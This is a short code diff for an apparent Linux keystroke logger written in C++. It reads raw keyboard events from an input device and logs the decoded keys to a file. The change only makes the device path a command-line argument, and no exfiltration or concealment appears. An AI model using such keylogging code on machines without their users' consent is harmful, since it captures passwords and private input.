@@ -120,10 +120,10 @@ std::string getKeyString(__u16 keycode, const std::vector<__u16>&
     return result;
 }
 
-void captureEvents(std::string &kbd_device){
+void captureEvents(char* kbd_device){
 
     // Opening keyboard file in Read Mode
-    int input_fd = open(kbd_device.c_str(), O_RDONLY, 0);
+    int input_fd = open(kbd_device, O_RDONLY, 0);
     // Checking if file opened successfully 
     if(input_fd == -1){
         std::cout << "Error opening input file" << '\n';
@@ -199,10 +199,15 @@ void captureEvents(std::string &kbd_device){
     close(output_fd);
 }
 
-int main(){
-    // Hardcorded keyboard device file location
-    std::string kbd_device = "/dev/input/event2";
+int main(int argc, char* argv[]){
+    // We need exactly one argument and that is the path of the file that we to log 
+    if(argc != 2) {
+        std::cout<<"Program needs exactly one argument to work." << std::endl;
+        return 0;
+    }
 
     // Function to read input events and convert them in readable keys and write those in log.txt
-    captureEvents(kbd_device);
+    captureEvents(argv[1]);
+    
+    return 0;
 }
